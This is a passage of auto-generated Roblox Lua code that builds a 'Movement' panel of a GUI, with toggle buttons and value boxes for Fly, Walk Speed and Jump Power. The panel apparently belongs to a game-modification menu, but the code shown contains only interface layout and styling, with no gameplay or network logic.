-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.======ACCENT======
G2L["168"] = Instance.new("Frame", G2L["164"]);
G2L["168"]["BorderSizePixel"] = 0;
G2L["168"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["168"]["Size"] = UDim2.new(1, 0, 0, 4);
G2L["168"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["168"]["Name"] = [[======ACCENT======]];
G2L["168"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.======ACCENT======.GuiColor
G2L["169"] = Instance.new("Frame", G2L["168"]);
G2L["169"]["BorderSizePixel"] = 0;
G2L["169"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["169"]["Size"] = UDim2.new(1, -2, 0, 2);
G2L["169"]["Position"] = UDim2.new(0, 1, 0, 1);
G2L["169"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["169"]["Name"] = [[GuiColor]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.======ACCENT======.GuiColor.UICorner
G2L["16a"] = Instance.new("UICorner", G2L["169"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.======TITLE======
G2L["16b"] = Instance.new("Frame", G2L["164"]);
G2L["16b"]["BorderSizePixel"] = 0;
G2L["16b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16b"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["16b"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["16b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16b"]["Name"] = [[======TITLE======]];
G2L["16b"]["LayoutOrder"] = 1;
G2L["16b"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.======TITLE======.text
G2L["16c"] = Instance.new("TextLabel", G2L["16b"]);
G2L["16c"]["TextWrapped"] = true;
G2L["16c"]["BorderSizePixel"] = 0;
G2L["16c"]["TextSize"] = 14;
G2L["16c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["16c"]["TextTransparency"] = 0.3;
G2L["16c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16c"]["BackgroundTransparency"] = 1;
G2L["16c"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["16c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16c"]["Text"] = [[Movement]];
G2L["16c"]["Name"] = [[text]];
G2L["16c"]["Position"] = UDim2.new(0.02273, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.======TITLE======.text.text
G2L["16d"] = Instance.new("UIStroke", G2L["16c"]);
G2L["16d"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.======TITLE======.text.UIPadding
G2L["16e"] = Instance.new("UIPadding", G2L["16c"]);
G2L["16e"]["PaddingLeft"] = UDim.new(0, 1);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.======TITLE======.minimise
G2L["16f"] = Instance.new("TextButton", G2L["16b"]);
G2L["16f"]["BorderSizePixel"] = 0;
G2L["16f"]["TextTransparency"] = 0.3;
G2L["16f"]["TextSize"] = 14;
G2L["16f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16f"]["BackgroundTransparency"] = 1;
G2L["16f"]["Size"] = UDim2.new(0, 35, 1, 0);
G2L["16f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16f"]["Text"] = [[-]];
G2L["16f"]["Name"] = [[minimise]];
G2L["16f"]["Position"] = UDim2.new(1, -30, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Fly
G2L["170"] = Instance.new("Frame", G2L["164"]);
G2L["170"]["BorderSizePixel"] = 0;
G2L["170"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["170"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["170"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["170"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["170"]["Name"] = [[Fly]];
G2L["170"]["LayoutOrder"] = 2;
G2L["170"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Fly.button
G2L["171"] = Instance.new("TextButton", G2L["170"]);
G2L["171"]["BorderSizePixel"] = 0;
G2L["171"]["TextTransparency"] = 1;
G2L["171"]["TextSize"] = 14;
G2L["171"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["171"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["171"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["171"]["ZIndex"] = 50;
G2L["171"]["BackgroundTransparency"] = 1;
G2L["171"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["171"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["171"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Fly.button.UIPadding
G2L["172"] = Instance.new("UIPadding", G2L["171"]);
G2L["172"]["PaddingTop"] = UDim.new(0, 3);
G2L["172"]["PaddingRight"] = UDim.new(0, 3);
G2L["172"]["PaddingLeft"] = UDim.new(0, 3);
G2L["172"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Fly.button.toggleFrame
G2L["173"] = Instance.new("Frame", G2L["171"]);
G2L["173"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["173"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["173"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["173"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["173"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Fly.button.toggleFrame.outlineStroke
G2L["174"] = Instance.new("UIStroke", G2L["173"]);
G2L["174"]["Thickness"] = 2;
G2L["174"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Fly.button.toggleFrame.toggleFade
G2L["175"] = Instance.new("CanvasGroup", G2L["173"]);
G2L["175"]["BorderSizePixel"] = 0;
G2L["175"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["175"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["175"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["175"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["175"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Fly.button.toggleFrame.toggleFade.UIGradient
G2L["176"] = Instance.new("UIGradient", G2L["175"]);
G2L["176"]["Rotation"] = 90;
G2L["176"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Fly.text
G2L["177"] = Instance.new("TextLabel", G2L["170"]);
G2L["177"]["TextWrapped"] = true;
G2L["177"]["ZIndex"] = 10;
G2L["177"]["BorderSizePixel"] = 0;
G2L["177"]["TextSize"] = 14;
G2L["177"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["177"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["177"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["177"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["177"]["BackgroundTransparency"] = 1;
G2L["177"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["177"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["177"]["Text"] = [[Fly]];
G2L["177"]["Name"] = [[text]];
G2L["177"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Fly.text.UIPadding
G2L["178"] = Instance.new("UIPadding", G2L["177"]);
G2L["178"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Fly.text.text
G2L["179"] = Instance.new("UIStroke", G2L["177"]);
G2L["179"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Fly.UIPadding
G2L["17a"] = Instance.new("UIPadding", G2L["170"]);
G2L["17a"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Fly.FlyChanger
G2L["17b"] = Instance.new("Frame", G2L["170"]);
G2L["17b"]["ZIndex"] = 55;
G2L["17b"]["BorderSizePixel"] = 0;
G2L["17b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17b"]["Size"] = UDim2.new(0, 70, 0, 20);
G2L["17b"]["Position"] = UDim2.new(1, -70, 0, 0);
G2L["17b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17b"]["Name"] = [[FlyChanger]];
G2L["17b"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Fly.FlyChanger.UIPadding
G2L["17c"] = Instance.new("UIPadding", G2L["17b"]);
G2L["17c"]["PaddingTop"] = UDim.new(0, 2);
G2L["17c"]["PaddingRight"] = UDim.new(0, 3);
G2L["17c"]["PaddingLeft"] = UDim.new(0, 3);
G2L["17c"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Fly.FlyChanger.textbox
G2L["17d"] = Instance.new("TextBox", G2L["17b"]);
G2L["17d"]["Name"] = [[textbox]];
G2L["17d"]["PlaceholderColor3"] = Color3.fromRGB(0, 124, 255);
G2L["17d"]["TextSize"] = 14;
G2L["17d"]["TextColor3"] = Color3.fromRGB(0, 124, 255);
G2L["17d"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["17d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["17d"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["17d"]["PlaceholderText"] = [[(50)]];
G2L["17d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["17d"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["17d"]["Text"] = [[]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Fly.FlyChanger.textbox.outlineStroke
G2L["17e"] = Instance.new("UIStroke", G2L["17d"]);
G2L["17e"]["Thickness"] = 2;
G2L["17e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["17e"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Fly.FlyChanger.textbox.buttonFade
G2L["17f"] = Instance.new("CanvasGroup", G2L["17d"]);
G2L["17f"]["BorderSizePixel"] = 0;
G2L["17f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17f"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["17f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17f"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Fly.FlyChanger.textbox.buttonFade.UIGradient
G2L["180"] = Instance.new("UIGradient", G2L["17f"]);
G2L["180"]["Rotation"] = 90;
G2L["180"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Fly.FlyChanger.textbox.text
G2L["181"] = Instance.new("UIStroke", G2L["17d"]);
G2L["181"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Walkspeed
G2L["182"] = Instance.new("Frame", G2L["164"]);
G2L["182"]["BorderSizePixel"] = 0;
G2L["182"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["182"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["182"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["182"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["182"]["Name"] = [[Walkspeed]];
G2L["182"]["LayoutOrder"] = 3;
G2L["182"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Walkspeed.button
G2L["183"] = Instance.new("TextButton", G2L["182"]);
G2L["183"]["BorderSizePixel"] = 0;
G2L["183"]["TextTransparency"] = 1;
G2L["183"]["TextSize"] = 14;
G2L["183"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["183"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["183"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["183"]["ZIndex"] = 50;
G2L["183"]["BackgroundTransparency"] = 1;
G2L["183"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["183"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["183"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Walkspeed.button.UIPadding
G2L["184"] = Instance.new("UIPadding", G2L["183"]);
G2L["184"]["PaddingTop"] = UDim.new(0, 3);
G2L["184"]["PaddingRight"] = UDim.new(0, 3);
G2L["184"]["PaddingLeft"] = UDim.new(0, 3);
G2L["184"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Walkspeed.button.toggleFrame
G2L["185"] = Instance.new("Frame", G2L["183"]);
G2L["185"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["185"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["185"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["185"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["185"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Walkspeed.button.toggleFrame.outlineStroke
G2L["186"] = Instance.new("UIStroke", G2L["185"]);
G2L["186"]["Thickness"] = 2;
G2L["186"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Walkspeed.button.toggleFrame.toggleFade
G2L["187"] = Instance.new("CanvasGroup", G2L["185"]);
G2L["187"]["BorderSizePixel"] = 0;
G2L["187"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["187"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["187"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["187"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["187"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Walkspeed.button.toggleFrame.toggleFade.UIGradient
G2L["188"] = Instance.new("UIGradient", G2L["187"]);
G2L["188"]["Rotation"] = 90;
G2L["188"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Walkspeed.text
G2L["189"] = Instance.new("TextLabel", G2L["182"]);
G2L["189"]["TextWrapped"] = true;
G2L["189"]["ZIndex"] = 10;
G2L["189"]["BorderSizePixel"] = 0;
G2L["189"]["TextSize"] = 14;
G2L["189"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["189"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["189"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["189"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["189"]["BackgroundTransparency"] = 1;
G2L["189"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["189"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["189"]["Text"] = [[Walk Speed]];
G2L["189"]["Name"] = [[text]];
G2L["189"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Walkspeed.text.UIPadding
G2L["18a"] = Instance.new("UIPadding", G2L["189"]);
G2L["18a"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Walkspeed.text.text
G2L["18b"] = Instance.new("UIStroke", G2L["189"]);
G2L["18b"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Walkspeed.UIPadding
G2L["18c"] = Instance.new("UIPadding", G2L["182"]);
G2L["18c"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Walkspeed.WalkspeedChanger
G2L["18d"] = Instance.new("Frame", G2L["182"]);
G2L["18d"]["ZIndex"] = 55;
G2L["18d"]["BorderSizePixel"] = 0;
G2L["18d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18d"]["Size"] = UDim2.new(0, 70, 0, 20);
G2L["18d"]["Position"] = UDim2.new(1, -70, 0, 0);
G2L["18d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18d"]["Name"] = [[WalkspeedChanger]];
G2L["18d"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Walkspeed.WalkspeedChanger.UIPadding
G2L["18e"] = Instance.new("UIPadding", G2L["18d"]);
G2L["18e"]["PaddingTop"] = UDim.new(0, 2);
G2L["18e"]["PaddingRight"] = UDim.new(0, 3);
G2L["18e"]["PaddingLeft"] = UDim.new(0, 3);
G2L["18e"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Walkspeed.WalkspeedChanger.textbox
G2L["18f"] = Instance.new("TextBox", G2L["18d"]);
G2L["18f"]["Name"] = [[textbox]];
G2L["18f"]["PlaceholderColor3"] = Color3.fromRGB(0, 124, 255);
G2L["18f"]["TextSize"] = 14;
G2L["18f"]["TextColor3"] = Color3.fromRGB(0, 124, 255);
G2L["18f"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["18f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["18f"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["18f"]["PlaceholderText"] = [[(16)]];
G2L["18f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["18f"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["18f"]["Text"] = [[]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Walkspeed.WalkspeedChanger.textbox.outlineStroke
G2L["190"] = Instance.new("UIStroke", G2L["18f"]);
G2L["190"]["Thickness"] = 2;
G2L["190"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["190"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Walkspeed.WalkspeedChanger.textbox.buttonFade
G2L["191"] = Instance.new("CanvasGroup", G2L["18f"]);
G2L["191"]["BorderSizePixel"] = 0;
G2L["191"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["191"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["191"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["191"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["191"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Walkspeed.WalkspeedChanger.textbox.buttonFade.UIGradient
G2L["192"] = Instance.new("UIGradient", G2L["191"]);
G2L["192"]["Rotation"] = 90;
G2L["192"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Walkspeed.WalkspeedChanger.textbox.text
G2L["193"] = Instance.new("UIStroke", G2L["18f"]);
G2L["193"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Jumppower
G2L["194"] = Instance.new("Frame", G2L["164"]);
G2L["194"]["BorderSizePixel"] = 0;
G2L["194"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["194"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["194"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["194"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["194"]["Name"] = [[Jumppower]];
G2L["194"]["LayoutOrder"] = 4;
G2L["194"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Jumppower.button
G2L["195"] = Instance.new("TextButton", G2L["194"]);
G2L["195"]["BorderSizePixel"] = 0;
G2L["195"]["TextTransparency"] = 1;
G2L["195"]["TextSize"] = 14;
G2L["195"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["195"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["195"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["195"]["ZIndex"] = 50;
G2L["195"]["BackgroundTransparency"] = 1;
G2L["195"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["195"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["195"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Jumppower.button.UIPadding
G2L["196"] = Instance.new("UIPadding", G2L["195"]);
G2L["196"]["PaddingTop"] = UDim.new(0, 3);
G2L["196"]["PaddingRight"] = UDim.new(0, 3);
G2L["196"]["PaddingLeft"] = UDim.new(0, 3);
G2L["196"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Jumppower.button.toggleFrame
G2L["197"] = Instance.new("Frame", G2L["195"]);
G2L["197"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["197"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["197"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["197"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["197"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Jumppower.button.toggleFrame.outlineStroke
G2L["198"] = Instance.new("UIStroke", G2L["197"]);
G2L["198"]["Thickness"] = 2;
G2L["198"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Jumppower.button.toggleFrame.toggleFade
G2L["199"] = Instance.new("CanvasGroup", G2L["197"]);
G2L["199"]["BorderSizePixel"] = 0;
G2L["199"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["199"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["199"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["199"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["199"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Jumppower.button.toggleFrame.toggleFade.UIGradient
G2L["19a"] = Instance.new("UIGradient", G2L["199"]);
G2L["19a"]["Rotation"] = 90;
G2L["19a"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Jumppower.text
G2L["19b"] = Instance.new("TextLabel", G2L["194"]);
G2L["19b"]["TextWrapped"] = true;
G2L["19b"]["ZIndex"] = 10;
G2L["19b"]["BorderSizePixel"] = 0;
G2L["19b"]["TextSize"] = 14;
G2L["19b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["19b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19b"]["BackgroundTransparency"] = 1;
G2L["19b"]["RichText"] = true;
G2L["19b"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["19b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19b"]["Text"] = [[Jump Power]];
G2L["19b"]["Name"] = [[text]];
G2L["19b"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Jumppower.text.UIPadding
G2L["19c"] = Instance.new("UIPadding", G2L["19b"]);
G2L["19c"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Jumppower.text.text
G2L["19d"] = Instance.new("UIStroke", G2L["19b"]);
G2L["19d"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Jumppower.UIPadding
G2L["19e"] = Instance.new("UIPadding", G2L["194"]);
G2L["19e"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Jumppower.JumppowerChanger
G2L["19f"] = Instance.new("Frame", G2L["194"]);
G2L["19f"]["ZIndex"] = 55;
G2L["19f"]["BorderSizePixel"] = 0;
G2L["19f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19f"]["Size"] = UDim2.new(0, 70, 0, 20);
G2L["19f"]["Position"] = UDim2.new(1, -70, 0, 0);
G2L["19f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19f"]["Name"] = [[JumppowerChanger]];
G2L["19f"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Jumppower.JumppowerChanger.UIPadding
G2L["1a0"] = Instance.new("UIPadding", G2L["19f"]);
G2L["1a0"]["PaddingTop"] = UDim.new(0, 2);
G2L["1a0"]["PaddingRight"] = UDim.new(0, 3);
G2L["1a0"]["PaddingLeft"] = UDim.new(0, 3);
G2L["1a0"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Jumppower.JumppowerChanger.textbox
G2L["1a1"] = Instance.new("TextBox", G2L["19f"]);
G2L["1a1"]["Name"] = [[textbox]];
G2L["1a1"]["PlaceholderColor3"] = Color3.fromRGB(0, 124, 255);
G2L["1a1"]["TextSize"] = 14;
G2L["1a1"]["TextColor3"] = Color3.fromRGB(0, 124, 255);
G2L["1a1"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["1a1"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a1"]["BorderMode"] = Enum.BorderMode.Inset;
